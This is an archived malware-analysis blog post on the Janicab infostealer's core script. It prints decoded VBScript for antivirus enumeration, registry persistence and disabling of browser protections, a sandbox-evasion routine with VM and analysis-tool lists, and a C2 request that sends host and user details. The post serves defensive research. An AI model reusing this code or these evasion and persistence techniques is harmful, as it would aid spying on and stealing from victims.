{
    "id": "0d618ad1-67d4-4c25-bfca-567358602c8b",
    "created_at": "2023-01-12T15:08:06.495554Z",
    "updated_at": "2025-03-27T02:16:59.277418Z",
    "deleted_at": null,
    "sha1_hash": "dab8dc94834b2b2f9c326094341cd08c1f6dc697",
    "title": "2022-05-27 - Janicab Series- The Core Artifact",
    "authors": "",
    "file_creation_date": "2022-06-01T12:23:38Z",
    "file_modification_date": "2022-06-01T12:23:38Z",
    "file_size": 256580,
    "plain_text": "# Janicab Series: The Core Artifact\n\n**[malwarology.com/2022/05/janicab-series-the-core-artifact/](https://www.malwarology.com/2022/05/janicab-series-the-core-artifact/)**\n\n2022-05-27\n\n\nMay 27, 2022\n\n\n[Malware Analysis,](https://www.malwarology.com/categories/malware-analysis) [Janicab](https://www.malwarology.com/categories/janicab)\nIn late April 2022, I was requested to analyze a software artifact. It was an instance of\nJanicab, a software with infostealing and spying capabilities known since 2013. Differently to\nother analyses I do as part of my job, in this particular case I can disclose parts of it with you\n[readers. I’m addressing those parts in a post series. Based on this specific sample, here](https://www.virustotal.com/gui/file/20026af8c1bd95d4a39c2d1d1c2909ed133a5d2efac2d6c6b87cbc4d2782fef0)\nI’going to analyse the Janicab core artifact. If you want to know more about the previous\n[infection stages, I recommend you reading this post (first part) and](https://www.malwarology.com/2022/05/janicab-series-first-steps-in-the-infection-chain/) [this post (second part).](https://www.malwarology.com/2022/05/janicab-series-further-steps-in-the-infection-chain/)\n\nArtifact 2.vbe, analysed [here, stores an encoded VBScript as an alternate data stream for](https://www.malwarology.com/2022/05/janicab-series-further-steps-in-the-infection-chain/)\nthe %USERPROFILE% directory and later executes it. I claim that such a script is an\ninstance of the Janicab malware. Therefore, I’m going to refer to this script with the name\nJanicab. I kindly ask the reader to trust my attribution for now, since I’ll provide support for\nmy claim in a dedicated and conclusive post.\n```\noWMI = \"\"\nSet oWMI = GetObject(\"winmgmts:\n{impersonationLevel=impersonate}!\\\\.\\root\\SecurityCenter\")\nSet oWMI = GetObject(\"winmgmts:\n{impersonationLevel=impersonate}!\\\\.\\root\\SecurityCenter2\")\nIF vartype(oWMI) = vbString Then\n     getAV = \"Unsupported OS\"\n     Exit Function\nEND IF\nav = \"\"\nnumav = 0\nSet colItems = oWMI.ExecQuery(\"Select displayName from AntiVirusProduct\")\n\n```\n**Listing 1**\n\nJanicab checks for the antivirus products installed on the infected system\n\nAs a first operation, Janicab attempts to understand which antivirus products are running on\nthe infected system. To achieve that, it leverages the Windows Management Instrumentation\n(WMI) API for VBScript and queries the AntivirusProduct class for the products names. It\n\n\n-----\n\nconcatenates the antivirus names in a single AND-separated string. Listing 1 shows that\npart of the Janicab code where the malware obtains the names of the installed antivirus\nproducts.\n```\nSet objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\nWhile 1\n     killRunningIE()\n     WScript.Sleep 300000\nWend\nFunction killRunningIE()\n On Error Resume Next\n Set colProcessList = objWMIService.ExecQuery(\"SELECT * FROM Win32_Process WHERE\nName = 'iexp\" & \"lore.exe'\")\n For Each objProcess in colProcessList\n     On Error Resume Next\n     If inStr(objProcess.CommandLine, \"-Embe\" & \"dding\") Then\n          objProcess.Terminate()\n     End If\n Next\nEnd Function\n\n```\n**Listing 2**\n\nie.vbe script as it appears after having decoded it\n\nJanicab embeds several files. All of them are encoded to escape an otherwise easy\ndetection. The encoding is always the same for all the embedded artifacts. The first file being\ndecoded is a VBScript stored on disk as an NTFS alternate data stream of the\n%USERPROFILE% directory with name ie.vbe. Ie.vbe is a VBScript encoded with the\nWindows Script Encoder. Janicab executes ie.vbe, which operates as a watchdog since it\nwakes up every five minutes and terminates all the instances Internet Explorer embedded in\nother applications. Listing 2 shows the full listing (after the decoding) of ie.vbe.\n\n\n-----\n\n**Figure 1**\n\nSMTP-error.txt decoy file dropped by 2.vbe\n\nA second file dropped by Janicab consists of a Shell Link Binary file (LNK) named ‘‘Microsoft\nSync Services.lnk’’ and stored in %APPDATA%\\Microsoft directory. Similarly to what\nobserved for the SMTP-error.txt.lnk (I analysed it in [this post), after parsing the LNK file it is](https://www.malwarology.com/2022/05/janicab-series-first-steps-in-the-infection-chain/)\npossible to observe the latter targeting cmd.exe and executing a file stored as an NTFS\nalternate data stream of %USERPROFILE% named h.vbe. Figure 1 shows just that.\n\n\n-----\n\n```\nSet s CreateObject( WScript.Shell )\nSet fileSys = CreateObject(\"Scripting.FileSystemObject\")\nIF NOT IsProcessRunning(\"explorer.exe\") THEN\n     s.Run \"explorer\", 0, 0 \nEND IF\npath = s.ExpandEnvironmentStrings(\"%userprofile%\")\nSet objFolder = fileSys.GetFolder(path)\npath = objFolder.ShortPath\nSet objFolder = Nothing\nuserProfilePath = split(path, \"\\\")\nUsername = userProfilePath(Ubound(userProfilePath))\nSet userProfilePath = Nothing\ns.currentdirectory = path & \"\\..\"\ns.Run \"cscript \"\"\" & Username & \"\"\":.vbe\", 0, 0\nFunction IsProcessRunning(strProcess )\n     On Error Resume Next\n  Dim Process, strObject\n  IsProcessRunning = False\n  strObject  = \"winmgmts://\" & s.ExpandEnvironmentStrings(\"%ComputerName%\")\n  For Each Process in GetObject( strObject ).InstancesOf( \"win32_process\" )\n          abc = Process.name\n          If abc <> \"\" Then\n            If UCase( Process.name ) = UCase( strProcess ) Then\n                   IsProcessRunning = True\n                   Exit Function\n              End If\n          End If\n  Next\nEnd Function\n\n```\n**Listing 3**\n\nh.vbe full listing\n\nA third file dropped by Janicab is the just mentioned script h.vbe. As the extension may\nsuggest, h.vbe is a VBScript encoded with Windows Script Encoder. If you consider Listing\n**3, showing h.vbe, then you might notice that h.vbe starts explorer.exe if it isn’t running yet**\n[and eventually executes .vbe (discussed in this section).](https://www.malwarology.com/2022/05/janicab-series-first-steps-in-the-infection-chain/)\n\n\n-----\n\n```\nFunction HandleCCleaner()\n     On Error Resume Next\n     ccPath1 = s.ExpandEnvironmentStrings(\"%systemdrive%\") & \"\\Program\nFiles\\CCleaner\"\n     ccPath2 = s.ExpandEnvironmentStrings(\"%systemdrive%\") & \"\\Program Files\n(x86)\\CCleaner\"\n     IF fileSys.FolderExists(ccPath1) OR fileSys.FolderExists(ccPath2) THEN\n          path1 =\n\"HKEY_CURRENT_USER\\Software\\Piriform\\CCleaner\\BrowserMonitoring\"\n          path2 = \"HKEY_CURRENT_USER\\Software\\Piriform\\CCleaner\\(Mon)3001\"\n          s.RegDelete path1\n          s.RegDelete path2\n     END IF\nEnd Function\n\n```\n**Listing 4**\n\nJanicab disables CCleaner browser monitoring capabilityg\n\nJanicab disables CCleaner browser monitoring capability. CCleaner is a common utility used\nfor cleaning unused files and invalid registry entries. As you may notice from Listing 4, it first\nchecks if CCleaner is installed on the infected system by testing the existence of any of two\nutility folders related to the application. If CCleaner is installed, then the malware disables the\nbrowser monitoring by deleting two registry keys controlling that capability:\n\nHKEY_CURRENT_USER\\Software\\Piriform\\CCleaner\\BrowserMonitoring\nHKEY_CURRENT_USER\\Software\\Piriform\\CCleaner(Mon)3001\n```\nWindows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce]\n\"1\"=\"C:\\\\Users\\\\researcher\\\\AppData\\\\Roaming\\\\Microsoft\\\\Microsoft Sync Services.lnk\"\n\n```\n**Listing 5**\n\nFull content of runOnce.reg\n\nJanicab persists to the next reboot of the infected system since it sets a RunOnce key. This\nform of persistence is achieved by dropping a registry file named runOnce.reg and importing\nits content in the registry by issuing reg.exe. As you can see from the content of runOnce.reg\nshowed in Listing 5, the RunOnce key points to the Microsoft Sync Services.lnk file. After\nthe command was issued, Janicab removes the runOnce.reg file.\n\n\n-----\n\n**Figure 2**\n\n.dll stores a screenshot as a JFIF image in a NTFS alternate data stream of %TMP%\n\n**Figure 3**\n\nScreenshot captured with .dll after issuing the commands of Figure 2\n\nJanicab drops a fifth file named .dll as an NTFS alternate data stream of the\n%USERPROFILE% directory. This artifacts is a DLL exporting a screenshot capturing utility.\nEvery time MyDllEntryPoint export of .dll is executed, a screenshot is stored as a NTFS\nalternate data stream of %TMP% named ~PF214C.tmp. Figure 2 shows an evidence of\nsuch a behavior collected in a safe and controlled environment. Figure 3 shows the\nscreenshot, a JFIF image, captured after issuing the commands reported in Figure 2.\n\n\n-----\n\n```\nWindows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main]\n\"NoProtectedModeBanner\"=dword:00000001\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\Zones\\3]\n\"2500\"=dword:00000003\n\n```\n**Listing 6**\n\nFull content of vista.reg\n\nanicab leverages WMI API for WBScript to query the Win32_OperatingSystem object and\nobtain the operating system version. If the running operating system is Microsoft Windows\nVista (Vista) then the malware drops another registry file named vista.reg. Its content, as for\nmany of the other drops I discuss in this post, is embedded in an obfuscated form. The\ncontent of vista.reg is reported in Listing 6. By executing vista.reg, Janicab attempts to\ndisable Internet Explorer protected mode and protected mode banner in Vista. After having\nimported vista.reg, Janicab removes the file.\n```\nWindows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main]\n\"Enable Browser Extensions\"=\"no\"\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings]\n\"BypassSSLNoCacheCheck\"=dword:00000001\n\"DisableCachingOfSSLPages\"=dword:00000000\n\n```\n**Listing 7**\n\nFull content of ie.reg\n\n\n-----\n\n```\nFunction IPConvert(IPAddress)\n  IF IsNumeric(IPAddress) THEN\n    IPConvert = \"0.0.0.0\"\n    For x = 1 To 4\n      Num = Int(IPAddress / 256 ^ (4 - x))\n      IPAddress = IPAddress - (Num * 256 ^ (4 - x))\n      IF Num > 255 THEN\n        IPConvert = \"0.0.0.0\"\n        Exit Function\n      END IF\n      IF x = 1 THEN\n        IPConvert = Num\n      ELSE\n        IPConvert = IPConvert & \".\" & Num\n      END IF\n    Next\n     END IF\nEnd Function\n\n```\n**Listing 8**\n\nJanicab function responsible for converting numerical seed to ip addresses\n\nThe malware drops another registry file called ie.reg. This artifact is stored as a NTFS\nalternate data stream of %USERPROFILE% directory. As you may notice from Listing 7, by\nimporting ie.reg with reg.exe utility, Janicab aims to disable Internet Explorer extensions.\nAfter all the just described operations, Janicab starts that procedure aimed at obtaining the ip\naddress of the Command & Control (C2) server. The C2 ip address is computed by starting\nfrom two distinct sources:\n\nhttp[s]://youtu.be/aZRJQdwN4-g\nhttp[s]://plus.google.com/108098760042015113400/posts?hl=en\n\nThe first link is about a YouTube video made private at time of analysis. The second link is\nabout a Google+ post unavailable at time of analysis due to the social media shutdown made\nofficial in 2019. However, from the Janicab source code, I know that the C2 ip address is\ncomputed by starting from a numerical seed posted somewhere in the web pages hosted at\nthose links. The seed is extracted by using the following regex: `we need (.*) views . The`\nseed is divided by the constant 1337 and eventually converted to an ip address with the\nfunction showed in Listing 8.\n\nThe malware loops potentially forever until it is able to find a seed in one of those pages. At\neach iteration of the loop, the link to be requested is picked up by random. If Janicab is\ncapable of obtaining the C2 address then it builds the C2 url according to the following\n\n\n-----\n\npattern: `http://{C2-IP}/B2mV-VzVc-81Az-135J . The malware validates the C2 url by`\nrequesting the /Status2.php resource expected to be hosted on the C2 url. If it finds the\nstring OKOKOK in the content of /Status2.php then the validation succeeds.\n\nEach infected host is univocally identified by a 35-symbols-long serial code. The serial code\nis stored in a text file named pSerial.txt and stored in a NTFS alternate data stream of\n%USERPROFILE% directory. Janicab checks the existence of the serial file and when it\nsucceeds it reads the code from that file. In this case the malware deletes the cookies for\nInternet Explorer, Mozilla Firefox, and Google Chrome. Finally, it attempts a C2 check-in by\nrequesting the resource /a.php hosted at the C2 url. This is a GET request with the following\nparameters:\n\nid. The value for this parameter is the serial code\nv. The value for this parameter is the operating system version number\nav. The value for this parameter is the list of the installed antivirus products (ANDseparated, as discussed before)\n\nIf Janicab doesn’t find a serial file on the infected system, it generates a new one by issuing\na request to the C2 url. The requested resource is /gid.php and the type of request is GET\nwith the following parameters:\n\naction. This parameter is set to the value add\ncn. The value for this parameter is the computer name\nun. The value for this parameter is the username of the user logged a time of execution\nv. The value for this parameter is the operating system version number\nav. The value for this parameter is the list of the installed antivirus products (ANDseparated, as discussed before)\nan. This parameter is set to the value tol7\n\n\n-----\n\n```\nWindows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main]\n\"Check_Associations\"=\"no\"\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\TabbedBrowsing]\n\"NewTabPageShow\"=dword:00000000\n[HKEY_CURRENT_USER\\Control Panel\\Cursors]\n\"AppStarting\"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,\\\n 00,25,00,5c,00,63,00,75,00,72,00,73,00,6f,00,72,00,73,00,5c,00,61,00,65,00,\\\n 72,00,6f,00,5f,00,61,00,72,00,72,00,6f,00,77,00,2e,00,63,00,75,00,72,00,00,\\\n 00\n\"Wait\"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,\\\n 00,25,00,5c,00,63,00,75,00,72,00,73,00,6f,00,72,00,73,00,5c,00,61,00,65,00,\\\n 72,00,6f,00,5f,00,61,00,72,00,72,00,6f,00,77,00,2e,00,63,00,75,00,72,00,00,\\\n 00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced]\n\"EnableBalloonTips\"=dword:00000000\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Recovery]\n\"AutoRecover\"=dword:00000002\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings]\n\"GlobalUserOffline\"=dword:00000000\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]\n\"Shell\"=\"wscript.exe \\\"%userprofile%:h.vbe\\\"\"\n\n```\n**Listing 9**\n\nFull content of r3g\n\nOnce obtained a new serial, the malware stores it on disk. Janicab asks the C2 whether it\nshould setup a register-based persistence point. That behavior is implemented by requesting\nthe resource /sm.php hosted at the C2 url. That is a GET request with a single parameter\ncalled data and valorized with the AND-separated list of the installed antiviruses. If the\nresponse to that request contains the string reg and, at the same time, Malwarebytes\nantivirus isn’t installed on the infected system, then Janicab drops a registry file named r3g.\nAs you may notice from Listing 9, r3g sets a persistence point for the already discussed\nh.vbe artifact. Before importing r3g with reg.exe, the malware deletes Microsoft Sync\nServices.lnk from disk and removes the RunOnce persistence point for that file.\n\n00-01-5D 00-10-E0 00-50-56 00-16-3E 00-12-5A 00-25-AE\n\n00-03-BA 00-14-4F 00-0C-29 08-00-27 00-15-5D 00-50-C2\n\n00-07-82 00-20-F2 00-05-69 00-1C-14 00-17-FA 00-50-F2\n\n00-0F-4B 00-21-28 00-03-FF 08-00-20 00-1D-D8 44-45-53\n\n00-10-4F 00-21-F6 00-1C-42 00-0D-3A 00-22-48 7C-ED-8D\n\n\n-----\n\n**Table 1**\n\nJanicab hardcoded MAC-substrings used to detect a virtualized environment\n\ntaskmgr.exe procexp64.exe immunitydebugger.exe gmer.exe\n\nprocmon.exe ollydbg.exe windbg.exe osam.exe\n\nprocmon64.exe wpe pro.exe tcpview.exe startup.exe\n\nprocexp.exe wireshark.exe tcpvcon.exe listdlls.exe\n\n**Table 2**\n\nJanicab checks if there exists a process having the name containing any of these strings\n\nJanicab operates a security assessment of the infected system aimed at understanding if it is\nbeing executed in an analysis environment. The security assessment is based of four\ndifferent checks:\n\nBaseboard manufacturer check. Malware analysis environments are quite often\nvirtualized. Virtual machines (VMs) usually emulate the hardware and sometimes VM\nsoftware providers include their signature on some virtualized hardware pieces.\nJanicab relies on that when it verifies if the baseboard manufacturer contains the\nstrings: parallels, virtual platform, or virtualbox. This check is implemented by querying\nthe WMI Win32_BaseBoard class for the Product field.\nInstalled drivers check. Another way to detect a VM consists in looking at the installed\ndrivers. Just as the hardware, VM distributors implement custom “fake” drivers\nexposing distinctive names. Janicab relies on that when it checks if there exist any\ninstalled driver containing one of the following strings: virtualbox, parallels, vmware.\nThe driver names are obtained by issuing the `driverquery shell command.`\nMAC address check. Another way to detect a VM consists in looking at the MAC\naddress. This approach relies on the expectation that the default MAC address\nexported by the virtualization software tend to be the same given the provider. Janicab\nverifies if the MAC address of the infected system contains one of the strings reported\nin Table 1 as a means to detect a virtualized environment. The MAC address of the\ninfected system is obtained by issuing the `ipcfonfig /all shell command.`\nRunning processes check. Janicab attempts to understand if it is being executed in a\nmalware analysis environment by verifying if any malware analysis tool is running in the\ninfected system. To this extent, the malware obtains a list of the currently running\nprocesses by issuing the tasklist shell command. Once done that, Janicab checks if\nthere exist a process having the name containing one of the strings listed in Table 2.\n\n\n-----\n\nIf any of the mentioned checks is satisfied then Janicab asks the C2 whether it should keep\nrunning or just quit. That behavior is implemented by issuing a GET request for the resource\n/rit.php hosted at the C2 url. The request parameters are the following:\n\ncn. The value for this parameter is the computer name\nun. The value for this parameter is the username of the user logged a time of execution\nan. This parameter is set to the value tol7\nid. This parameter is set to the serial code\nr. This parameter groups all the material collected as a result of the security\nassessment. More precisely, it is set to a comma separated list of the following strings:\nthe baseboard manufacturer, the suspicious installed driver (if it was found), the\nsuspicious MAC address (if it was found), and the suspicious running process (if it was\nfound)\n```\nvmProd = isVmProduct()\nvmDrivers = isVmDrivers()\nvmMac = isVmMAC()\nrunningProc = checkRunningProcess()\nIF NOT vmProd = False OR NOT vmDrivers = False OR NOT vmMac = False OR NOT\nrunningProc = False THEN\n     reason = vmProd & \", \" & vmDrivers & \", \" & vmMac & \", \" & runningProc\n     it = getPage(server & \"/rit.php?cn=\" & computerName & \"&un=\" & userName &\n\"&an=\" & notifyName & \"&id=\" & Serial & \"&r=\" & reason, 60, \"get\")\n     IF NOT it = \"skip\" AND NOT fileSys.FileExists\n(s.ExpandEnvironmentStrings(\"%systemdrive%\") & \"\\xitx\") THEN\n          Wscript.Quit 0\n     END IF\nEND IF\n\n```\n**Listing 10**\n\nJanicab quits if detects a malware analysis environment\n\nIf the response from the C2 is skip and, at the same time, there isn’t a directory named xitx\nunder the system drive (pointed by the %SYSTEMDRIVE% environment variable) then\nJanicab quits. I asked myself about the reason for that directory check. Since xitx is a\ndomain name related to a provider of managed cybersecurity services, it is possible that the\nmalware developer wanted to avoid the execution on a system either running some product\ndistributed by that firm or managed by that firm. Listing 10 shows an excerpt taken from\nJanicab source code regarding the behavior I have just described.\n\nEvery minute, Janicab tries to perform the following actions in that exact order:\n\n1. If k.dll, the keylogging utility, has been dropped on the infected system then the\n\nmalware executes it.\n\n\n-----\n\n2. Janicab contacts the C2 to fetch any command to execute on the infected system. The\n\ninstance object of this report defines two special commands: `downFile and` `runVbs .`\nEach special command should have a corresponding function named as the command\nand implementing the intended behavior. However, our instance only ships with the\nimplementation for `downFile command. DownFile downloads a file hosted on the C2`\nserver and stores it on disk. The download function issues a request for the C2 url for\nthe /d.php resource. This is a GET request having a single parameter, named f, holding\nthe base64-encoded name of the file to be downloaded. In addition to the special\ncommands, Janicab allows for the execution of any command that can be issued via\npowershell.exe if present or cmd.exe as an alternative.\n\n3. Janicab executes .dll, the screenshot capturing utility.\n\n4. If there exists a screenshot stored on the infected system then the malware sends it to\n\nthe C2. This action is implemented by issuing a POST request to the C2 url, resource\n/rs.php. The request parameters are:\n\ni. This parameter is set to the serial code\nd. This parameter is set to the base64-encoded screenshot\nt. This parameter is set to the request timestamp\nl. This parameter is set to the length of the encoded screenshot\nOnce the screenshot has been shipped, the malware wipes it from the infected system\n\n5. If there exists some keylogger output on the infected system then Janicab sends it to\n\nthe C2. This action is implemented by issuing a POST request to the C2 url, resource\n/rk.php. The request parameters are exactly the same to those ones characterizing the\nC2 request for the previous point. Once the keylogger output has been shipped, the\nmalware wipes that stream from the infected system.\n\nIn the next post of this series I will finalize this series by discussing a bit about the attribution\nand by providing some Indicators of Compromise (IoCs) regarding this particular infection\nchain. As always, if you want to share comments or feedbacks (rigorously in broken Italian or\nbroken English) do not esitate to drop me a message at admin[@]malwarology.com.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-27 - Janicab Series- The Core Artifact.pdf"
    ],
    "report_names": [
        "2022-05-27 - Janicab Series- The Core Artifact.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536086,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1654086218,
    "ts_modification_date": 1654086218,
    "files": {
        "pdf": "https://archive.orkl.eu/dab8dc94834b2b2f9c326094341cd08c1f6dc697.pdf",
        "text": "https://archive.orkl.eu/dab8dc94834b2b2f9c326094341cd08c1f6dc697.txt",
        "img": "https://archive.orkl.eu/dab8dc94834b2b2f9c326094341cd08c1f6dc697.jpg"
    }
}